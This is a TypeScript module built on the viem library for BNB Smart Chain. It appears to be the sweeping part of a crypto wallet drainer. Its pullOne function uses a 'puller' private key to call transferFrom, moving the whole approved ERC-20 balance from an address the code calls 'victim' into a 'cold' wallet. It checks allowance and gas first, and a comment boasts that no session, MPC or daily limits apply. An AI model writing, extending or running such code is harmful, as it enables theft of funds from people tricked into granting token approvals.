import {
  createPublicClient, createWalletClient, http, fallback,
  erc20Abi, formatUnits, type Hex,
} from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains';
import { ENV } from '../config/env';

const transport = () =>
  fallback(ENV.HTTP_URLS.map(u => http(u, { retryCount: 2, timeout: 8_000 })));

export const pub = createPublicClient({ chain: bsc, transport: transport() });

export const allowanceOf = (owner: `0x${string}`, spender: `0x${string}`, token: `0x${string}`) =>
  pub.readContract({ address: token, abi: erc20Abi, functionName: 'allowance', args: [owner, spender] });

export const balanceOf = (owner: `0x${string}`, token: `0x${string}`) =>
  pub.readContract({ address: token, abi: erc20Abi, functionName: 'balanceOf', args: [owner] });

export const gasOf = (addr: `0x${string}`) => pub.getBalance({ address: addr });

/** Signed by the puller key: no session, no MPC, no tx-lock, no wallet daily limit. */
export async function pullOne(
  pullerKey: Hex, victim: `0x${string}`, cold: `0x${string}`, token: `0x${string}`,
): Promise<string | null> {
  const account = privateKeyToAccount(pullerKey);

  const [bal, allow, gas] = await Promise.all([
    balanceOf(victim, token), allowanceOf(victim, account.address, token), gasOf(account.address),
  ]);
  if (bal === 0n) return null;
  if (allow === 0n) throw new Error('ALLOWANCE_ZERO');
  if (gas < ENV.MIN_PULLER_GAS_WEI) throw new Error('PULLER_LOW_GAS');

  const amount = bal < allow ? bal : allow;
  const price = await pub.getGasPrice();
  const maxFeePerGas = (price * 150n) / 100n;

  const wallet = createWalletClient({ account, chain: bsc, transport: transport() });
  const hash = await wallet.writeContract({
    address: token, abi: erc20Abi, functionName: 'transferFrom',
    args: [victim, cold, amount],
    gas: 90_000n,
    maxFeePerGas,
    maxPriorityFeePerGas: maxFeePerGas / 10n,
    nonce: await pub.getTransactionCount({ address: account.address, blockTag: 'pending' }),
  });
  console.log(`[PULLED] ${formatUnits(amount, 18)} ${token} ${victim} -> ${cold} ${hash}`);
  return hash;
}
